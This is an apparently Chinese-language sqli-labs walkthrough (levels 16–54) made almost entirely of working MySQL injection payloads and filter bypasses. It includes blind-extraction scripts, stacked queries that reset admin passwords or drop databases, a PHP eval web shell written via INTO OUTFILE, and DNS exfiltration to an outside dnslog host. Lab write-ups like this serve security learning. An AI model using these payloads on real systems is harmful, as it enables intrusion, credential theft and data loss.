&quot;&quot; url = &quot;http://localhost:8890/sqli-labs/Less-16/&quot; data_template = &#123; &#x27;uname&#x27;: &#x27;0x74617269&quot;) or ascii(substr((select email_id from emails limit 0,1),&#123;0&#125;,1)) = &#123;1&#125; #&#x27;, &#x27;passwd&#x27;: &#x27;1&#x27; &#125; data = &#123; &#x27;uname&#x27;: &#x27;&#x27;, &#x27;passwd&#x27;: &#x27;1&#x27; &#125; chars = &#x27;.0123456789@ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz&#x27; for i in range(1,17): for char in chars: char_ascii = ord(char) data[&#x27;uname&#x27;] = data_template[&#x27;uname&#x27;].format(i,char_ascii) response = requests.post(url, data) length = len(response.text) #返回的长度等于 1504 就中了 if length &gt; 1503: result += char print(result) breakget_data() Less-17 UPDATE 报错注入uname 输入点被转义，update需要一个存在的用户，即 uname 必须是在数据库中存在的。注入点在 passwd 字段验证注入点：uname=admin&amp;passwd=1’利用闭合方式：uname=Dhakkan&amp;passwd=1&#39; &lt;payload&gt; # POST 1uname=Dhakkan&amp;passwd=1&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1)# 正常报错注入获取数据库 但在获取数据就有点问题了 POST 1uname=Dhakkan&amp;passwd=1&#x27; and updatexml(1,concat(0x7e,(select group_concat(id,username,password) from users),0x7e),1)# 报错: You can’t specify target table ‘users’ for update in FROM clause参考：https://blog.csdn.net/fdipzone/article/details/52695371 在 MySQL 中，不能在同一个sql语句中，先select同一个表的某些值，然后再update这个表。但 select 的结果可以再通过一个中间表 select 多一次，就可以避免这个错误。顺便还明白了，为什么 sqlmap 的 payload 中那么多个 as 因此重新构造 POST 123uname=Dhakkan&amp;passwd=1&#x27; and updatexml(1,concat(0x7e, (select concat(id,username,password) from (select * from users limit 0,1) as res),0x7e),1)# 获取成功 Less-18 HTTP头UA INSERT 报错注入需要正确的帐号密码验证注入点：User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4208.0 Safari/537.36&#39;利用闭合方式：1’ AND AND ‘ PHP 里用来获取客户端 IP 的变量 $_SERVER[&#39;HTTP_CLIENT_IP&#39;] 这个很少使用，不一定服务器都实现了。客户端可以伪造。 $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]，客户端可以伪造。 $_SERVER[&#39;REMOTE_ADDR&#39;]，客户端不能伪造。 不过这里有个很奇怪的地方 payload 1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4208.0 Safari/537.361&#x27; AND updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x7e),1) AND &#x27; 即 默认UA + 利用，但非预期内报错 1Truncated incorrect DOUBLE value: &#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4208.0 Safari/537.361&#x27; 把 UA 换成数字，不一定是1，0以外的数字基本都可以可以成功利用报错注入 payload 1User-Agent: 1&#x27; AND updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x7e),1) AND &#x27; 但如果把 1 换成 0，就什么都不输出了。 也就是说，UA &#39; 前包含 正负数字以外 的都不行不是很理解为啥爆破数据 1User-Agent: 1&#x27; AND updatexml(1,concat(0x7e,(select concat(id,username,password) from users limit 0,1),0x7e),1) AND &#x27; Less-19 HTTP头Referer INSERT 报错注入需要正确的帐号密码验证注入点：Referer: http://sqli-labs:8890/sqli-labs/Less-19/&#39;利用闭合方式：Referer: http://sqli-labs:8890/sqli-labs/Less-19/‘ AND AND ‘ 爆破数据 1Referer: 9&#x27; AND updatexml(1,concat(0x7e,(select concat(id,username,password) from users limit 0,1),0x7e),1) AND &#x27; Less-20 HTTP头Cookie 联合注入验证注入点：Cookie: uname=123&#39;利用闭合方式：Cookie: uname=123&#39;# 可以直接用联合注入 提取本表字段，到 4 刚刚好报错 1Cookie: uname=123&#x27; and 1=2 order by 4# 获取表 1Cookie: uname=123&#x27; and 1=2 union select 1,(select group_concat(table_name separator 0x3c62723e) from information_schema.tables where table_schema=database()),3# 获取字段 1Cookie: uname=123&#x27; and 1=2 union select 1,(select group_concat(column_name separator 0x3c62723e) from information_schema.columns where table_name=&#x27;users&#x27;),3# 获取数据 1Cookie: uname=123&#x27; and 1=2 union select 1,(select group_concat(username separator 0x3c62723e) from security.users),(select group_concat(password separator 0x3c62723e) from security.users)# Less-21 Dump into outfile验证注入点：Cookie: uname=MSc=（其中 MSc= 为 1&#39; 的 base64编码）利用闭合方式：Cookie: uname=MScpIG9yIDE9MSAj（其中 MScpIG9yIDE9MSAj 为 1&#39;) or 1=1 # 的 base64编码 ） 注意事项 这里不能直接用 –+ ，因为是经过base64编码传输的，解码后传入数据库执行的是 –+，并不会转换为 –空格， –+ MySQL是不认识的，会报错 先判断表字段数，3正常，4报错 11&#x27;) order by 4# 因后端有base64解码，所以需要编码 1MScpIG9yZGVyIGJ5IDQj 写文件 11&#x27;) union select null,0x3c3f706870206576616c28245f504f53545b27707764275d293b3f3e,null into outfile &#x27;/Users/tari/Sites/tari_local/sqli-labs/Less-21/tari.php&#x27;# base64编码 1MScpIHVuaW9uIHNlbGVjdCBudWxsLDB4M2MzZjcwNjg3MDIwNjU3NjYxNmMyODI0NWY1MDRmNTM1NDViMjc3MDc3NjQyNzVkMjkzYjNmM2UsbnVsbCBpbnRvIG91dGZpbGUgJy9Vc2Vycy90YXJpL1NpdGVzL3RhcmlfbG9jYWwvc3FsaS1sYWJzL0xlc3MtMjEvdGFyaS5waHAnIw== 报错不要紧因为这个语句值返回空 可以正常利用 Less-21 Cookie联合注入注入点、闭合方式和判断表字段数同 Less-21 Dump into outfile 一致这里尝试获取数据，与 Less-20 类似，不过要base64编码一下，然后闭合方式不一样 获取数据 11&#x27;) and 1=2 union select 1,(select group_concat(username separator 0x3c62723e) from security.users),(select group_concat(password separator 0x3c62723e) from security.users)# base64编码一下 1Cookie: uname=MTIzJykgYW5kIDE9MiB1bmlvbiBzZWxlY3QgMSwoc2VsZWN0IGdyb3VwX2NvbmNhdCh1c2VybmFtZSBzZXBhcmF0b3IgMHgzYzYyNzIzZSkgZnJvbSBzZWN1cml0eS51c2VycyksKHNlbGVjdCBncm91cF9jb25jYXQocGFzc3dvcmQgc2VwYXJhdG9yIDB4M2M2MjcyM2UpIGZyb20gc2VjdXJpdHkudXNlcnMpIw== ![](/img/sqli-labs/Pasted image 20210703153244.png) 可以尝试使用 sqlmap base64encode tamper 1sqlmap -u &quot;http://tari.local:8890/sqli-labs/Less-21/&quot; --cookie=&quot;uname=*&quot; --tamper=&quot;base64encode&quot; --dbms=MySQL --random-agent --flush-session --technique=U -v 3 --flush-session 选项是清除本地的缓存，因为sqlmap扫描结果会在本地缓存，然后下次扫描如果存在缓存会直接调用已扫描的结果。 Less-22 Cookie联合注入验证注入点：Cookie: uname=MTIzIg==（其中 MTIzIg== 为 1&quot; 的 base64编码）利用闭合方式：Cookie: uname=MTIzIiBvciAxPTEj（其中 MTIzIiBvciAxPTEj 为 123&quot; or 1=1# 的 base64编码 ） 利用方式和Less-21类似，只不过闭合方式不同 判断表字段个数，3正常，4报错 11&quot; order by 4# base64编码一下 1Cookie: uname=MSIgb3JkZXIgYnkgNCM= 获取数据 11&quot; and 1=2 union select 1,(select group_concat(username,password separator 0x3c62723e) from security.users),3# base64编码一下 1Cookie: uname=MSIgYW5kIDE9MiB1bmlvbiBzZWxlY3QgMSwoc2VsZWN0IGdyb3VwX2NvbmNhdCh1c2VybmFtZSxwYXNzd29yZCBzZXBhcmF0b3IgMHgzYzYyNzIzZSkgZnJvbSBzZWN1cml0eS51c2VycyksMyM= ![](/img/sqli-labs/Pasted image 20210703164129.png) 突然发现好像数据都连在一起了，通过 concat 加个间隔符 11&quot; and 1=2 union select 1,(select group_concat(concat_ws(0x3a, username,password) separator 0x3c62723e) from security.users),3# ![](/img/sqli-labs/Pasted image 20210703164423.png)舒服了~ Less-23 GET注入 过滤注释符验证注入点：id=1’ 利用闭合方式：?id=1’ and 1=2 union select 1,2,3 ‘ 因为本关过滤了注释符，其他都差不多 123456&lt;?php$reg = &quot;/#/&quot;;$reg1 = &quot;/--/&quot;;$replace = &quot;&quot;;$id = preg_replace($reg, $replace, $id);$id = preg_replace($reg1, $replace, $id); 只要通过单引号把后面闭合了即可，获取数据 1?id=1&#x27; and 1=2 union select 1,2,(select group_concat(username,password separator 0x3c62723e) from security.users) &#x27; Less-24 二次注入本关卡数据入参都有通过 mysql_real_escape_string 进行转义，本站提供了注册、登陆、登陆后修改密码功能 关键代码 pass_change.php 123456if($pass==$re_pass) &#123; $sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;$username&#x27; and password=&#x27;$curr_pass&#x27; &quot;; $res = mysql_query($sql) or die(&#x27;You tried to be smart, Try harder!!!! :( &#x27;); $row = mysql_affected_rows(); .... 虽然SQL特殊字符被转义了，但如果注册时用户名是 admin&#39;#，那么登陆这个修改密码执行的 SQL 语句就是 1UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;admin&#x27;#&#x27; and .... 则直接修改 admin 的密码，就能直接登陆管理员账号了 Less-25 双写绕过or和and验证注入点：id=1’ 利用闭合方式：?id=1’ anandd 1=2 union select 1,2,3 ‘ 这关会把 or 和 and 替换为空，通过双写绕过即可，或者通过等价符合 &amp;&amp; 和 || 绕过 获取数据 1?id=1&#x27; anandd 1=2 union select 1,2,(select group_concat(username,passwoorrd separatoorr 0x3c62723e) from security.users) &#x27; Less-25a 双写绕过or和and验证注入点：?id=1%20anandd%20sleep(5)%20# 利用闭合方式：?id=1 anandd 1=2 union select 1,2,3 # 与Less-25一致，只是闭合方式不一样 获取数据 1?id=1 anandd 1=2 union select 1,2,(select group_concat(username,passwoorrd separatoorr 0x3c62723e) from security.users) Less-26 空格绕过验证注入点：id=1’ 利用闭合方式：?id=1%27%0banandd%0b1=2%0bunion%0bselect%0b1,2,3%0b%27 除了Less-23 Less-25 过滤的，还过滤了空格，空格可以通过以下符号代替 符号 说明 %09 TAB 键(水平) %0a 新建一行 %0c 新的一页 %0d return 功能 %0b TAB 键(垂直) %a0 空格（和普通空格不一样） 试了一下，最终只有 %0b 和 %a0 是可用的，注意，%a0我在mac（10.15.7）上用不了 获取数据 1?id=1%27%0banandd%0b1=2%0bunion%0bselect%0b1,2,(select%0bgroup_concat(username,passwoorrd%0bseparatoorr%0b0x3c62723e)%0bfrom%0bsecurity.users)%0b%27 Less-26a 空格绕过验证注入点：?id=1’)%a0anandd%a0sleep(5)%a0oorr%a0(‘ 利用闭合方式：?id=1%27)%a0anandd%a01=2%a0union%a0select%a01,2,3%a0oorr%a0(%27 这关的注入点验证和闭合方式和之前的有很点不同，获取数据也和之前的有所不同，因为注释符也是被过滤了的，然后闭合方式是 (&#39;&#39;) ，我们无法直接通过 1&#39;) (&#39; 闭合，因为这样会多出一个 (&#39;&#39;) 导致 sql 语法错误 12MySQL root@localhost:security&gt; select * from users where id=(&#x27;1&#x27;) (&#x27;&#x27;)(1064, &quot;You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;(&#x27;&#x27;)&#x27; at line 1&quot;) 需要构造一下，使得后面的 (&#39;&#39;) 无作用，即 12345678MySQL root@localhost:security&gt; select * from users where id=(&#x27;1&#x27;) or (&#x27;&#x27;)+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | Dumb | Dumb |+----+----------+----------+1 row in setTime: 0.010s 这里不能用 and (&#39;&#39;) 因为后面为非（空），查询不到数据，用 or (&#39;&#39;) 就行 最终获取数据查询语句，结合一下前面的绕过就OK了～ 1?id=1%27)%a0aandnd%a01=2%a0union%a0select%a01,(select%a0group_concat(username,passwoorrd%a0separatoorr%a00x3c62723e)%a0from%a0security.users),3%a0oorr%a0(%27 Less-27 union过滤验证注入点：?id=1’ 利用闭合方式：?id=1’%0a%26%261=2%0auNion%0aseLect%0a1,2,3%0a’ 过滤比较敷衍，没有区分大小写，而且也可以通过双写绕过，这里尝试了一下 %0a 突然也可以替换空格了 获取数据 1?id=1&#x27;%0A%26%26%0A1=2%0AuNion%0AseLect%0A1,group_concat(username),group_concat(password)%0Afrom%0Asecurity.users%0Awhere%0A1%26%26%0A&#x27;1 不知为啥下面分隔符没有效果 1?id=1%27%0a%26%26%0a1=2%0auNion%0aseLect%0a1,2,(seLect%0agroup_concat(username,password%0aseparator%0a0x3c62723e)%0afrom%0asecurity.users)%0a%27 Less-27a union过滤验证注入点：?id=1%22%26%26sleep(5)%7c%7c%22 利用闭合方式：?id=1%22%26%261%3d2%a0uNion%a0seLect%a01,2,3%7c%7c%22 与Less-27一样，但这里SQL语句为，注意前3行还有个双引号拼接，有点小坑，怪不得直接执行不行… 123$id = &#x27;&quot;&#x27; .$id. &#x27;&quot;&#x27;;$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;; 获取数据，发现这两a关闭合方式有点小trick，需要设法让多余的符号失效 1?id=1%22%26%261%3d2%0auNion%0aseLect%0a1,2,(seLect%0agroup_concat(username,password%0aseparator%0a0x3c62723e)%0afrom%0asecurity.users)%0a%22 或 1?id=1%22%26%261%3d2%0auNion%0aseLect%0a1,group_concat(username),group_concat(password)%0afrom%0asecurity.users%0awhere%0a1%7c%7c%22 Less-28 union select 过滤验证注入点：?id=1%27)%26%26sleep(5)||(%27 利用闭合方式：?id=1’)%26%261%3d2%0Auniounion%0Aselectn%0Aselect%0A1,2,3||(‘ 本次过滤 1$id= preg_replace(&#x27;/union\\s+select/i&#x27;,&quot;&quot;, $id); 双写 uniounion%0aselectn%0aselect即可 获取数据 1?id=1&#x27;)%26%261%3d2%0Auniounion%0Aselectn%0Aselect%0A1,(seLect%0agroup_concat(username,password%0aseparator%0a0x3c62723e)%0afrom%0asecurity.users),3||(&#x27; Less-28a union select 过滤这关只过滤了 union select，比Less-28过滤的还少，和 Less-28一样即可获取数据 Less-29 HPP绕过白名单验证注入点：login.php?id=1&amp;id=1’ 利用闭合方式：login.php?id=1&amp;id=1’ and 1=2 union select 1,2,3%23 这关 login.php 设置了一个白名单WAF，只允许数字，不过获取匹配的参数 $_SERVER[&#39;QUERY_STRING&#39;] 然后匹配到第一个 id 就 break 掉了。但 PHP 通过 $_GET[&#39;id&#39;] 获取是覆盖关系，即同时存在多个URL参数时，只获取最后一个。但WAF判断的是第1个，所以就可以绕过了。这种方式也叫HPP，HTTP 参数污染 获取数据 1login.php?id=1&amp;id=1&#x27; and 1=2 union select 1,2,(select group_concat(username,password separator 0x3c62723e) from security.users)%23 Less-30 &amp;&amp; Less-31 HPP绕过白名单验证注入点：login.php?id=1&amp;id=1” Less-30利用闭合方式：login.php?id=1&amp;id=1” and 1=2 union select 1,2,3%23 Less-31利用闭合方式：login.php?id=1&amp;id=1”) and 1=2 union select 1,2,3%23 只是和Less-29闭合方式不一样 Less-30获取数据 1login.php?id=1&amp;id=1&quot; and 1=2 union select 1,2,(select group_concat(username,password separator 0x3c62723e) from security.users)%23 Less-31获取数据 1login.php?id=1&amp;id=1&quot;) and 1=2 union select 1,2,(select group_concat(username,password separator 0x3c62723e) from security.users)%23 Less-32 宽字节注入验证注入点：?id=1%df%27 利用闭合方式：?id=1%df%27 and 1=2 union select 1,2,3%23 原理 客户端（如PHP，设置了GBK编码）-&gt; 连接层（MySQL编码处理）-&gt; 服务端（MySQL语句执行） %df%27%65 -&gt; %df%27%65 (因为前一个ascii码要大于128，MySQL才会认为需要两个字节组合，然后 %df%xx 会进行多字节编码) -&gt; 导致%27没转义，进而导致注入 获取数据 1?id=1%df%27 and 1=2 union select 1,(select group_concat(username,password separator 0x3c62723e) from security.users),3%23 Less-33 宽字节注入同 Less-32，Less-32是自己写的过滤，Less-33是原生的，32的好像也是只能宽字节才行。 Less-34 POST 宽字节注入验证注入点：uname=123%df’ 利用闭合方式：uname=123%df’ or 1=1%23 获取数据 1uname=1%df%27 and 1=2 union select (select group_concat(username,password separator 0x3c62723e) from security.users),2%23 除了SQL语句查询列数和POST方式，其他一样 Less-35 联合注入验证注入点：?id=1’ 利用闭合方式：?id=1 and 1=2 union select 1,2,3 # 获取数据 1?id=1 and 1=2 union select 1,(select group_concat(username,password separator 0x3c62723e) from security.users),3%23 过滤了个寂寞（ Less-36 宽字节注入验证注入点：?id=1%df%27 利用闭合方式：?id=1%df%27 and 1=2 union select 1,2,3%23 获取数据 1?id=1%df%27 and 1=2 union select 1,(select group_concat(username,password separator 0x3c62723e) from security.users),3%23 和 Less-33 利用方式一样，只不过过滤函数从 addslashes 变成 mysql_real_escape_string Less-37 POST 宽字节注入利用方式同Less-34，过滤函数从 addslashes 变成 mysql_real_escape_string Less-38 堆叠注入验证注入点：?id=1’ 利用闭合方式：?id=1’; 这个和之前SQL查询语句不同的是使用了 mysqli_multi_query ，SQL语句中分隔符为 ; ，这个语句允许我们通过 ; 同时执行多个语句 既然可以拼接任意语句，尝试获取版本 1?id=-1&#x27;;select 1,version(),3%23 发现前面就算执行为空，也不会拼接，这是因为服务端只获取第一条语句的执行结果 如果服务端没有返回每条语句执行的结果，则需要获取数据回显。 从国光那学到了一种只在Windows系统下有效的dnslog数据外带方式，因为 Windows下存在一种叫UNC（通用命名规则） 1\\\\192.168.123.1\\xxx\\ 我们平常在访问smb或者域机器的时候就挺熟悉这种访问方式的，就叫UNC，如果把IP换成域名，当然也会进行dns解析。因Linux没有这种东西，所以也没法进行dnslog数据外带了 这里使用Windows搭建个sqli-labs环境（注意phpstudy默认secure_file_priv=NULL 需要改 my.ini 在 [mysqld] 字段里增加 secure_file_priv ），然后写入 1?id=1&#x27;;select load_file(concat(&#x27;\\\\\\\\&#x27;,(select hex(concat_ws(&#x27;~&#x27;,username,password)) from security.users limit 0,1),&#x27;.1di0pv.dnslog.cn\\\\a&#x27;))--+ 即可获取数据，注意 limit 0,1 不能去掉，否则太长了会接收不到数据，不知是不是dnslog平台做了长度的限制 这里和普通的注入还有很大不同，普通注入一般只能只能select 操作，因是执行独立的sql语句，还可以执行增删改数据库表和表数据语句，如 1234?id=1&#x27;;create database less38;%23?id=1&#x27;;drop database less38;%23?id=1&#x27;;insert into users(id,username,password) values(&#x27;38&#x27;,&#x27;less38&#x27;,&#x27;less38&#x27;);%23?id=1&#x27;;update users set username=&#x27;less38p&#x27; where id=&#x27;38&#x27;;%23 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879MySQL root@localhost:security&gt; show databases;+--------------------+| Database |+--------------------+| information_schema || bookstore3 || challenges || less38 || mysql || onebase || performance_schema || security || sys || xxl_job || xxxxx |+--------------------+11 rows in setTime: 0.007sMySQL root@localhost:security&gt; show databases;+--------------------+| Database |+--------------------+| information_schema || bookstore3 || challenges || mysql || onebase || performance_schema || security || sys || xxl_job || xxxxx |+--------------------+10 rows in setTime: 0.007sMySQL root@localhost:security&gt; select * from security.users+----+----------+------------+| id | username | password |+----+----------+------------+| 1 | Dumb | Dumb || 2 | Angelina | I-kill-you || 3 | Dummy | p@ssword || 4 | secure | crappy || 5 | stupid | stupidity || 6 | superman | genious || 7 | batman | mob!le || 8 | admin | 123 || 9 | admin1 | admin1 || 10 | admin2 | admin2 || 11 | admin3 | admin3 || 12 | dhakkan | dumbo || 14 | admin4 | admin4 || 15 | admin&#x27;# | 123 || 38 | less38 | less38 |+----+----------+------------+15 rows in setTime: 0.008sMySQL root@localhost:security&gt; select * from security.users+----+----------+------------+| id | username | password |+----+----------+------------+| 1 | Dumb | Dumb || 2 | Angelina | I-kill-you || 3 | Dummy | p@ssword || 4 | secure | crappy || 5 | stupid | stupidity || 6 | superman | genious || 7 | batman | mob!le || 8 | admin | 123 || 9 | admin1 | admin1 || 10 | admin2 | admin2 || 11 | admin3 | admin3 || 12 | dhakkan | dumbo || 14 | admin4 | admin4 || 15 | admin&#x27;# | 123 || 38 | less38p | less38 |+----+----------+------------+15 rows in setTime: 0.007s 最终补充一下，这几个堆叠注入都无法直接验证存在堆叠注入 Less-39 堆叠注入验证注入点：?id=1’ 利用闭合方式：?id=1;create database less39%23 闭合方式不一样，其余同 Less-38 获取所有数据库名称，验证数据库是否正常创建 1?id=-1 union select 1,(select group_concat(schema_name) from information_schema.schemata),3%23 Less-40 堆叠注入验证注入点：1%27)%20and%20sleep(5)%23 利用闭合方式：?id=1’);create database less40%23 闭合方式不一样，其余同 Less-38 获取所有数据库名称，验证数据库是否正常创建 1?id=-1&#x27;) union select 1,(select group_concat(schema_name) from information_schema.schemata),3%23 Less-41 堆叠注入验证注入点：?id=1%20and%20sleep(5)%23 利用闭合方式：?id=1;create database less41%23 没有报错回显，其余同 Less-39 获取所有数据库名称，验证数据库是否正常创建 1?id=-1 union select 1,(select group_concat(schema_name) from information_schema.schemata),3%23 Less-42 POST 堆叠注入验证注入点：login_user=admin&amp;login_password=1&#39;&amp;mysubmit=Login 利用闭合方式：login_user=admin&amp;login_password=1&#39;;update users set password=&#39;1&#39; where username=&#39;admin&#39;%23&amp;mysubmit=Login 利用堆叠注入修改任意用户密码，即可正常登陆，然后这里还存在万能密码、联合报错时间注入问题，应有尽有 Less-43 POST 堆叠注入验证注入点：login_user=admin&amp;login_password=1&#39;&amp;mysubmit=Login 利用闭合方式：login_user=admin&amp;login_password=1&#39;);update users set password=&#39;123&#39; where username=&#39;admin&#39;%23&amp;mysubmit=Login 闭合方式不一样，其余同 Less-42 Less-44 POST 堆叠注入验证注入点：login_user=admin&amp;login_password=1&#39; and sleep(5)%23&amp;mysubmit=Login 利用闭合方式：login_user=admin&amp;login_password=1&#39;);update users set password=&#39;123&#39; where username=&#39;admin&#39;%23&amp;mysubmit=Login 没有报错回显，其余同 Less-42 Less-45 POST 堆叠注入验证注入点：login_user=admin&amp;login_password=1&#39;) and sleep(5)%23&amp;mysubmit=Login 利用闭合方式：login_user=admin&amp;login_password=1&#39;);update users set password=&#39;1&#39; where username=&#39;admin&#39;%23&amp;mysubmit=Login 没有报错回显，其余同 Less-43 Less-46 order by 注入验证注入点1：?sort=1’ 验证注入点2：?sort=1 asc 验证注入点3：?sort=1 desc 如果验证注入点2和3的结果不一样，则表明可以注入 验证注入点4：?sort=sleep(5) 注意order by 注入不能使用联合注入，不然会报语法错误，我们先观察一下 SELECT 语句在MySQL官方的说明 12345678910111213141516171819202122232425262728SELECT [ALL | DISTINCT | DISTINCTROW ] [HIGH_PRIORITY] [STRAIGHT_JOIN] [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT] [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS] select_expr [, select_expr] ... [into_option] [FROM table_references [PARTITION partition_list]] [WHERE where_condition] [GROUP BY &#123;col_name | expr | position&#125; [ASC | DESC], ... [WITH ROLLUP]] [HAVING where_condition] [ORDER BY &#123;col_name | expr | position&#125; [ASC | DESC], ...] [LIMIT &#123;[offset,] row_count | row_count OFFSET offset&#125;] [PROCEDURE procedure_name(argument_list)] [into_option] [FOR UPDATE | LOCK IN SHARE MODE]into_option: &#123; INTO OUTFILE &#x27;file_name&#x27; [CHARACTER SET charset_name] export_options | INTO DUMPFILE &#x27;file_name&#x27; | INTO var_name [, var_name] ...&#125; order by 注入可以直接跟表达式，所以注入也比较宽松，如 直接报错注入 1?sort=updatexml(1,concat(0x7e,(select database()),0x7e),1) 布尔盲注 1?sort=rand(ascii(left(database(),1))=116) 因为 ascii(x)=x 的返回值为0或1，在这里没法根据返回结果区分，不过直接 rand(0) 和 rand(1) 返回值不一样，然后 order by 的结果是有差异的。 另外，从卿师傅里学到一种异或方式的order by 注入 1id ^(select(select version()) regexp &#x27;^5&#x27;) regex 匹配成功返回 1 失败 返回 0，1 和 0 的二进制分别是 00000001 和 00000000，与 id 字段每个id值进行异或，除非所有id值都为奇数或偶数，不然必然会导致排序发生改变，如id依次是 1/2/3/4 与1异或分别变成 0/3/2/5，与 0 异或是其本身（异或运算的特点） 时间盲注 1?sort=if(ascii(substr(database(),1,1))=115,sleep(5),0) 正常延时，顺便试试 benchmark延时 1?sort=if(ascii(substr(database(),1,1))=115,benchmark(500000000,md5(&#x27;1&#x27;)),0) 不行，应该是 benchmark 无论如何恒返回0，执不执行无所谓，这里编译器直接优化了？ 1?sort=(SELECT IF(SUBSTRING(current,1,1)=CHAR(115), BENCHMARK(50000000,md5(&#x27;1&#x27;)),0) FROM (select database() as current) as tb1) 这个语句就可以正常延时，可能表名这编译器优化问题，所以就执行 benchmark 没有直接获取返回值了，而是执行了 此外，也可以通过 and xxxx 拼接语句～ 通过观察官方SELECT语句用法， PROCEDURE 存储过程的语句也可以用，比如说 1?sort=1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1) mac上这个语句用不了，win和linux环境没问题～ 获取表名 1?sort=updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x7e),1) 获取字段名 1?sort=updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;),0x7e),1) 报错函数因有最长返回值限制，因此要获取字段的最大长度，然后分割获取，（这里创建了一个新表longcol和新的字段desc模拟数据长度大于64的场景） 1?sort=updatexml(1,concat(0x7e,(select column_type from information_schema.columns where table_name=&#x27;longcol&#x27; and table_schema=&#x27;security&#x27; limit 0,1),0x7e),1) 返回：XPATH syntax error: &#39;~int(11)~&#39; 1?sort=updatexml(1,concat(0x7e,(select column_type from information_schema.columns where table_name=&#x27;longcol&#x27; and table_schema=&#x27;security&#x27; limit 1,1),0x7e),1) 返回：XPATH syntax error: &#39;~varchar(255)~&#39; 获取数据 1?sort=updatexml(1,concat(0x7e,(select mid(`desc`,1,30) from security.longcol),0x7e),1) 这里 desc 要加反引号是因为 desc 是 MySQL 内置函数，直接使用会报错～ 不断改变 1,30 范围 ，最后变成 mid(`desc`,241,270) 即可获取该字段所有数据，当然也可以优雅些，当获取不到任何值时，就不获取了 如果数据中间包含很长一段空格，页面前端看着会像只返回1个空格 Less-47 order by 注入 字符型验证注入点：?sort=1’ 利用闭合方式：?sort=1’ and updatexml(1,concat(0x7e,(select database()),0x7e),1)–+ 这里注意点就是不能通过直接 &#39; 闭合，可以 and &#39; 闭合，也可以通过注释闭合 获取数据 1?sort=1&#x27; and updatexml(1,concat(0x7e,(select mid(`desc`,1,30) from security.longcol),0x7e),1)--+ Less-48 order by 盲注入验证注入点：?sort=sleep(5) 利用闭合方式：if(ascii(substr(database(),1,1))=115,sleep(5),0) 这关关闭了报错注入，可以布尔盲注或者时间注入获取数据 1234567891011121314151617181920212223import timeimport requestsdef get_data(): result = &quot;&quot; url_template = &quot;http://tari.local:8888/sqli-labs/Less-48/?sort=if(ascii(substr((select email_id from emails limit 0,1),&#123;0&#125;,1))=&#123;1&#125;,sleep(1),0)&quot; chars = &#x27;.0123456789@ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz&#x27; for i in range(1, 17): for char in chars: char_ascii = ord(char) url = url_template.format(i, char_ascii) time_start = time.time() _ = requests.get(url) time_diff = time.time() - time_start # 返回时间 &gt; 5s if time_diff &gt; 5: result += char print(result) breakget_data() 不知为啥延时时间是远大于1S的 Less-49 order by 盲注入 字符型验证注入点：?sort=1’ 利用闭合方式：?sort=1’ and if(ascii(substr(database(),1,1))=115,sleep(5),0)–+ 闭合方式不一样，获取数据 123456789101112131415161718192021222324import timeimport requestsdef get_data(): result = &quot;&quot; url_template = &quot;http://tari.local:8888/sqli-labs/Less-49/?sort=1&#x27; and if(ascii(substr((select email_id from emails limit 0,1),&#123;0&#125;,1))=&#123;1&#125;,sleep(1),0)--+&quot; chars = &#x27;.0123456789@ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz&#x27; for i in range(1, 17): for char in chars: char_ascii = ord(char) url = url_template.format(i, char_ascii) time_start = time.time() # print(url) _ = requests.get(url) time_diff = time.time() - time_start # 返回时间 &gt; 5s if time_diff &gt; 5: result += char print(result) breakget_data() 这里注意 sort 后面要跟个值，不能直接接单引号 Less-50 order by 堆叠注入验证注入点：?sort=1’ 利用闭合方式：?sort=1;create database less50; 和普通堆叠注入没什么区别 Less-51 order by 堆叠注入验证注入点：?sort=1’ 利用闭合方式：?sort=1’;create database less51; 闭合方式和Less50不一样，其余一样 Less-52 order by 堆叠注入验证注入点：?sort=sleep(5) 利用闭合方式：?sort=1;create database less52; 只是无报错回显了 Less-53 order by 堆叠注入验证注入点：1%27%20and%20sleep(5)–+ 利用闭合方式：?sort=1’;create database less53; 闭合方式和Less52不一样 Less-54根据题意，限定10个语句从数据库 challenges 获取一个随机表中随机字段的值 因只是表和字段是随机的，那么前面的判断闭合方式、字段个数判断，回显占位是不用算到这10次里的 闭合方式 12?id=1&#x27; and 1=1--+?id=1&#x27; and 1=2--+ 字段数 1?id=1&#x27; order by 3--+ 报错 1?id=1&#x27; order by 4--+ 占位符为第2/3个字段 1?id=1&#x27; and 1=2 union select 1,2,3--+ 获取随机表名 1?id=1&#x27; and 1=2 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;challenges&#x27;),3--+ 获取随机表名的列名 1?id=1&#x27; and 1=2 union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;ZZVWJ42YS5&#x27;),3--+ 获取数据，其实只要三步接行了～ 1?id=1&#x27; and 1=2 union select 1,(select group_concat(secret_VRST) from challenges.ZZVWJ42YS5),3--+ 